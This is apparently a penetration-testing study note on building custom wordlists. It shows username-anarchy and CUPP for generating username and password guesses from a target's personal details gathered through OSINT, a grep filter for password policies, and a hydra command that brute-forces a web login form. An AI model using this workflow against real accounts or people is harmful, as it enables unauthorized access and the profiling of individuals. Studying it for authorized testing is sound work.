---
aliases:
  - Custom Wordlists
---
# Custom Wordlists

Make usernames with anarchy and passwd with CUPP with that existing file

```
 xato-net-10-million-usernames-dup.txt
```

## Username Anarchy

```shell-session
./username-anarchy -l
```

```shell-session
sudo apt install ruby -y
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
```

```shell-session
./username-anarchy Jane Smith > jane_smith_usernames.txt
```

## CUPP

> The efficacy of CUPP hinges on the quality and depth of the information you feed it. It's akin to a detective piecing together a suspect's profile - the more clues you have, the clearer the picture becomes. So, where can one gather this valuable intelligence for a target like Jane Smith?
>
> * `Social Media`: A goldmine of personal details: birthdays, pet names, favorite quotes, travel destinations, significant others, and more. Platforms like Facebook, Twitter, Instagram, and LinkedIn can reveal much information.
> * `Company Websites`: Jane's current or past employers' websites might list her name, position, and even her professional bio, offering insights into her work life.
> * `Public Records`: Depending on jurisdiction and privacy laws, public records might divulge details about Jane's address, family members, property ownership, or even past legal entanglements.
> * `News Articles and Blogs`: Has Jane been featured in any news articles or blog posts? These could shed light on her interests, achievements, or affiliations.

> CUPP will then take your inputs and create a comprehensive list of potential passwords:
>
> * Original and Capitalized: `jane`, `Jane`
> * Reversed Strings: `enaj`, `enaJ`
> * Birthdate Variations: `jane1994`, `smith2708`
> * Concatenations: `janesmith`, `smithjane`
> * Appending Special Characters: `jane!`, `smith@`
> * Appending Numbers: `jane123`, `smith2024`
> * Leetspeak Substitutions: `j4n3`, `5m1th`
> * Combined Mutations: `Jane1994!`, `smith2708@`

```shell-session
sudo apt install cupp -y
cupp -i
```

```shell-session
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```

```shell-session
hydra -L usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
```
